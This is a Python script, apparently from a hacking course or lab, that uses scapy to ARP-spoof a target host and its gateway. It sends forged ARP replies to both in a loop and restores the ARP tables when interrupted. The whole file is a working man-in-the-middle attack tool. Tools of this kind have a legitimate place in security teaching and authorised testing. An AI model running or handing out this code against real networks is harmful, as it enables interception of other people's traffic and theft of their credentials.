#!/usr/bin/env python3

import scapy.all as scapy
import time


def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_request = broadcast/arp_request

    answered, unanswered = scapy.srp(arp_broadcast_request, timeout=1, verbose=False)
    sent, answer = answered[0]

    return answer.hwsrc


def spoof(target_ip, spoof_ip):
    """
    Spoof an ARP response back to the target machine
    impersonating as the spoofed IP Address.

    :param target_ip: Target Machine IP
    :param spoof_ip: IP to spoof as
    :return:
    """

    target_mac_address = get_mac_address(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):

    destination_mac_address = get_mac_address(destination_ip)
    source_mac_address = get_mac_address(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac_address,
                       psrc=source_ip, hwsrc=source_mac_address)
    scapy.send(packet, count=4, verbose=False)


target_ip = "10.0.2.7"
gateway_ip = "10.0.2.1"

sent_packets_counter = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_counter += 2
        print(f"\r[+] Packets sent: {sent_packets_counter}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ...... Resetting ARP tables..... Please wait..\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
